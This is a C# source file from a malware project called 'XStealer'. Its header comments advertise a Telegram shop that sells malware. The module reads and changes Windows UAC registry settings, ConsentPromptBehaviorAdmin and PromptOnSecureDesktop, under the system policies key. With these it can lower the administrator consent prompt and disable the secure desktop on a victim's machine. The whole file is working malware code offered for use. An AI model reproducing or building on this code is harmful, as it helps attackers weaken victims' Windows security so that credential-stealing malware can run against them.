// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using Helpers;
    using Microsoft.Win32;

    public static class Uac
    {
        const string KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
        const string VALUE = "ConsentPromptBehaviorAdmin", SECURE = "PromptOnSecureDesktop";

        public static Enums.AdminPromptType AdminPromptBehavior
        {
            get
            {
                if (Environment.OSVersion.Version.Major < 6) { return Enums.AdminPromptType.AllowAll; }
                Enums.AdminPromptType result;
                using var registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                using RegistryKey registryKey2 = registryKey.OpenSubKey(KEY, false);
                Enums.AdminPromptType adminPromptType = Enums.AdminPromptType.DimmedPromptForNonWindowsBinaries;
                adminPromptType = (Enums.AdminPromptType)(((registryKey2?.GetValue(VALUE, adminPromptType)) as int?) ?? ((int)adminPromptType));
                if (ForceDimPromptScreen)
                {
                    if (adminPromptType.Equals(Enums.AdminPromptType.Prompt)) { return Enums.AdminPromptType.DimmedPrompt; }
                    if (adminPromptType.Equals(Enums.AdminPromptType.PromptWithPasswordConfirmation)) { return Enums.AdminPromptType.DimmedPromptWithPasswordConfirmation; }
                }
                result = adminPromptType;
                return result;
            }
            set
            {
                if (value != AdminPromptBehavior)
                {
                    using var registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    using RegistryKey registryKey2 = registryKey.OpenSubKey(KEY, true);
                    if (ForceDimPromptScreen)
                    {
                        if (value.Equals(Enums.AdminPromptType.Prompt)) { value = Enums.AdminPromptType.DimmedPrompt; }
                        if (value.Equals(Enums.AdminPromptType.PromptWithPasswordConfirmation)) { value = Enums.AdminPromptType.DimmedPromptWithPasswordConfirmation; }
                    }
                    registryKey2?.SetValue(VALUE, (int?)value);
                }
            }
        }

        public static bool ForceDimPromptScreen
        {
            get
            {
                if (Environment.OSVersion.Version.Major < 6) { return false; }
                bool result = true;
                try
                {
                    using var registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    using RegistryKey registryKey2 = registryKey.OpenSubKey(KEY, false);
                    result = (((registryKey2?.GetValue(SECURE, 0)) as int?) ?? 0) > 0;
                }
                catch { }
                return result;
            }
            set
            {
                if (value != ForceDimPromptScreen)
                {
                    using var registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    using RegistryKey registryKey2 = registryKey.OpenSubKey(KEY, true);
                    registryKey2?.SetValue(SECURE, value ? 1 : 0);
                }
            }
        }
    }
}